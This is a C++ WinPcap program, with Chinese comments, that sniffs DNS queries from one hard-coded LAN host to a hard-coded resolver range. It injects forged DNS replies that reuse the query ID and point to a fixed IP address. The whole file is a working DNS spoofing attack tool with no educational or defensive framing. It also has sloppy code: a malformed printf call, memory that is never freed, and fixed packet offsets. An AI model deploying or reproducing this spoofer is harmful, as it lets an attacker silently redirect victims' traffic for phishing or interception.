// PcapTest.cpp : Defines the entry point for the console application.
#include "stdio.h"
#include "pcap.h"
#include "remote-ext.h"
#include "winsock.h"
#include <string.h>
void packet_hander(u_char *param,const struct pcap_pkthdr *header,const u_char *pkt_data);
//4字节的IP地址
typedef struct ip_address
{
	u_char byte1;
	u_char byte2;
	u_char byte3;
	u_char byte4;
}ip_address;
//IP包头
typedef struct ip_header 
{
	u_char ver_ihl;    //版本 4bit + 首部长度 4bit
	u_char tos;     //服务类型
	u_short tlen;    //总长度
	u_short identification;  
	u_short flags_fo;
	u_char ttl;    //存活时间 time to live
	u_char proto;  //协议
	u_short crc;
	ip_address saddr;
	ip_address daddr;
}ip_header;
//TCP包头部结构
typedef struct tcp_header {
	WORD SourPort;
	WORD DestPort;
	DWORD SeqNo;
	DWORD AckNo;
	BYTE Hlen;
	BYTE Flag;
	WORD WndSize;
	WORD ChkSum;
	WORD UrgPtr;
}tcp_header;
//TCP伪首部
typedef struct tcp_pseheader 
{
	ip_address saddr;
	ip_address daddr;
	u_char placeholder;
	u_char proto;
	WORD tcplength;
}tcp_pseheader;
//UDP头部结构
typedef struct udp_header 
{
	u_short sport; //源端口
	u_short dport; //目的端口
	u_short len;
	u_short crc;
}udp_header;
//UDP伪首部
typedef struct psd
{
	ip_address saddr;
	ip_address daddr;
	char           mbz;
	char           ptcl;
	unsigned short udpl;
}PSD,*PPSD;
//DNS结构
typedef struct dns
{
	unsigned short id;
	unsigned short flags;
	unsigned short quests;
	unsigned short answers;
	unsigned short author;
	unsigned short addition;
}DNS,*PDNS;
//DNS问题结构
typedef struct query
{
	unsigned short type;
	unsigned short classes;
}QUERY,*PQUERY;
//DNS回答结构
typedef struct response
{
	unsigned short name; 
	unsigned short type;
	unsigned short classes;
	unsigned short ttl1;
	unsigned short ttl2;
	unsigned short length;
	unsigned short addr1;
	unsigned short addr2;
}RESPONSE,*PRESPONSE;
pcap_t *adhandle;
int main(int argc,char **argv)
{
	pcap_if_t* alldevs;
	pcap_if_t* d;
	int i=0;
	int inum;
	char errbuf[PCAP_ERRBUF_SIZE];
	u_int netmask;
	char packet_filter[]="ip and udp";
	struct bpf_program fcode;

	if (pcap_findalldevs_ex(PCAP_SRC_IF_STRING,NULL,&alldevs,errbuf)==-1)
	{
		fprintf(stderr,"error in pcap_findalldevs_ex:%s\r\n",errbuf);
		printf("\r\n");
		
		return 0;
	}
	for (d=alldevs;d;d=d->next)
	{
		printf("%d.%s\n",++i,d->name);
		printf("\r\n");
		if (d->description)
		{
			printf(("{%s}\n",d->description));
			printf("\r\n");
		}
		else
		{
			
			printf("{No description}\n}");
			printf("\r\n");
		}
	}
	if (i == 0)
	{
		printf("{\r\nNo interface found! Make sure WinPcap is install}");
		return 0;
		
	}
	printf("Enter the interface number{1-%d}:",i);
	scanf("%d",&inum);
	
	if (inum<1||inum>i)
	{
		printf("\nInterface number out of range.\n");
		pcap_freealldevs(alldevs);
		return -1;
		
	}
	for (d=alldevs,i=0;i<inum-1;d=d->next,i++);
	if ((adhandle=pcap_open(d->name,65536,PCAP_OPENFLAG_PROMISCUOUS,1000,NULL,errbuf))==NULL)
	{
		fprintf(stderr,"\nUnable to open the adapter.%s is not supported by winpcap\n",d->name);
		pcap_freealldevs(alldevs);
		return -1;
		
	}
	if (pcap_datalink(adhandle)!=DLT_EN10MB)
	{
		fprintf(stderr,"\nThis program works on Ethernet networks.\n");
		pcap_freealldevs(alldevs);
		return -1;
		
		
	}
	if (d->addresses!=NULL)
	{
		netmask=((struct sockaddr_in*)(d->addresses->netmask))->sin_addr.S_un.S_addr;
	}
	else
	{
		netmask=0xffffff;
	}
	if (pcap_compile(adhandle,&fcode,packet_filter,1,netmask)<0)
	{
		fprintf(stderr,"\nUnable to compile the packet filter. Check the syntax.\n");
		pcap_freealldevs(alldevs);
		return -1;
	}
	if (pcap_setfilter(adhandle,&fcode)<0)
	{
		fprintf(stderr,"\nError setting the filter.\n");
		pcap_freealldevs(alldevs);
		return -1;
	}
	printf("\nlistening on %s...\n",d->description);
	pcap_freealldevs(alldevs);
	pcap_loop(adhandle,0,packet_hander,NULL);
	
	return 0;
}
USHORT checksum(USHORT* buffer, int size)
{	
	unsigned long cksum = 0;
	while(size>1)	
	{
		cksum += *buffer++;	
		size -= sizeof(USHORT);	
	}
	if(size)		
	{
		
		cksum += *(UCHAR*)buffer;
		
	}	
	cksum = (cksum>>16) + (cksum&0xffff); 	
	cksum += (cksum>>16);             
	return (USHORT)(~cksum);
	
}
void packet_hander(u_char *param,const struct pcap_pkthdr *header,const u_char *pkt_data)     
{

	struct tm *ltime;
	char timestr[16];
	time_t local_tv_sec;
	u_char *newpacket=new u_char[500];
	ip_header *oldipheader = (ip_header*)(pkt_data+14);
	udp_header *udpoldheader = (udp_header*)(pkt_data+34);
	dns *olddns = (dns*)(pkt_data+42);
	memset(newpacket,0,500);
	char temp[1024];
	int ulen=0;
	unsigned char *dname;
	int udplen = sizeof(udp_header);
	int dnslen =sizeof(dns);
	int querylen = sizeof(query);
	int responselen = sizeof(response);
	int psdlen = sizeof(psd);
	int packetlen = header->len+16;
	int questlen = header->len-54;
	int sumindex = header->len;

// 	local_tv_sec = header->ts.tv_sec;
// 	ltime = localtime(&local_tv_sec);
// 	strftime(timestr,sizeof(timestr),"%H:%M:%S",ltime);
// 	printf("%s\n",timestr);


	if (oldipheader->saddr.byte1 == 192&&oldipheader->saddr.byte2 == 168&&oldipheader->saddr.byte3 == 0&&oldipheader->saddr.byte4 ==101&&oldipheader->daddr.byte1 == 202&&oldipheader->daddr.byte2
		== 102&&oldipheader->daddr.byte3 == 224) 
	{
		
		ulen = ntohs(udpoldheader->len)-udplen-dnslen-querylen;
		dname = new u_char[ulen];
		memcpy(dname,pkt_data+14+20+udplen+dnslen,ulen);
		
		ip_header *ipnewpack = new ip_header;
		ipnewpack->ver_ihl = oldipheader->ver_ihl;
		ipnewpack->tos = oldipheader->tos;
		ipnewpack->tlen = htons(20+udplen+dnslen+ulen+querylen+16);
		ipnewpack->identification = htons(64528);
		ipnewpack->flags_fo = 0x0040;
		ipnewpack->ttl = 252;
		ipnewpack->proto = oldipheader->proto;
		ipnewpack->saddr = oldipheader->daddr;
		ipnewpack->daddr = oldipheader->saddr;
		ipnewpack->crc = 0;
		ipnewpack->crc = checksum((unsigned short*)ipnewpack,20);
		
		query *oldquery = (query*)(pkt_data+54+ulen);
		
		udp_header *udpnewheader = new udp_header;
		udpnewheader->dport = udpoldheader->sport;
		udpnewheader->sport = udpoldheader->dport;
		udpnewheader->len = htons(udplen+dnslen+querylen+ulen);
		udpnewheader->crc = 0;
		psd *newpsdpacket = new psd;
		newpsdpacket->saddr = ipnewpack->saddr;
		newpsdpacket->daddr = ipnewpack->daddr;
		newpsdpacket->mbz = 0;
		newpsdpacket->ptcl = IPPROTO_UDP;
		newpsdpacket->udpl = htons(udplen+dnslen+ulen+querylen+responselen);
		
		dns *dnsnewpack = new dns;
		dnsnewpack->id = olddns->id;
		dnsnewpack->flags = htons(0x8180);
		dnsnewpack->quests = htons(1);
		dnsnewpack->answers = htons(1);
		dnsnewpack->author = 0;
		dnsnewpack->addition = 0;
		
		query *querynewpack = new query;
		querynewpack->classes = oldquery->classes;
		querynewpack->type = oldquery->type;
		
		response *responsenewpack = new response;
		responsenewpack->name = htons(0xc00c);
		responsenewpack->type = oldquery->type;
		responsenewpack->classes = oldquery->classes;
		responsenewpack->ttl1 = htons(0xff);
		responsenewpack->ttl2 = htons(0xff);
		responsenewpack->length = htons(4);
		responsenewpack->addr1 = 0x873d;
		responsenewpack->addr2 = 0x69a9;
		
		memset(temp,0,1024);
		memcpy(temp,newpsdpacket,psdlen);
		memcpy(temp+psdlen,udpnewheader,udplen);
		memcpy(temp+psdlen+udplen,dnsnewpack,dnslen);
		memcpy(temp+psdlen+udplen+dnslen,dname,ulen);
		memcpy(temp+psdlen+udplen+dnslen+ulen,querynewpack,querylen);
		memcpy(temp+psdlen+udplen+dnslen+ulen+querylen,responsenewpack,responselen);
		udpnewheader->crc = checksum((USHORT*)temp,psdlen+udplen+dnslen+ulen+querylen+responselen);
		
		memset(newpacket,0,14);
		memcpy(newpacket,pkt_data+6,6);    //构造以太网包头
		memcpy(newpacket+6,pkt_data,6);
		memcpy(newpacket+12,pkt_data+12,2);  
		memcpy(newpacket+14,ipnewpack,20);   //构造IP包头
		memcpy(newpacket+34,udpnewheader,udplen);
		memcpy(newpacket+34+udplen,dnsnewpack,dnslen);
		memcpy(newpacket+34+udplen+dnslen,dname,ulen);
		memcpy(newpacket+34+udplen+dnslen+ulen,querynewpack,querylen);
	    memcpy(newpacket+34+udplen+dnslen+ulen+querylen,responsenewpack,16);
		
		printf("old id:%x\tnew id:%x\n",olddns->id,dnsnewpack->id);
		
		printf("\n------------------------------------------------------------\n");
		
		if (pcap_sendpacket(adhandle,newpacket,34+udplen+dnslen+ulen+querylen+16) != 0)
		{
			printf("\nError sending the packet:\n");
			return;
		}
// 		char szBuffer[100];
// 		memcpy(szBuffer,newpacket,14);
// 		for (int i=0;i<86;i++)
// 		{
// 			szBuffer[14+i] = i;
// 		}
// 		if (pcap_sendpacket(adhandle,(u_char*)szBuffer,100) == 0)
// 		{
// 			printf("%s\n","success!");
// 		}

	} 	

}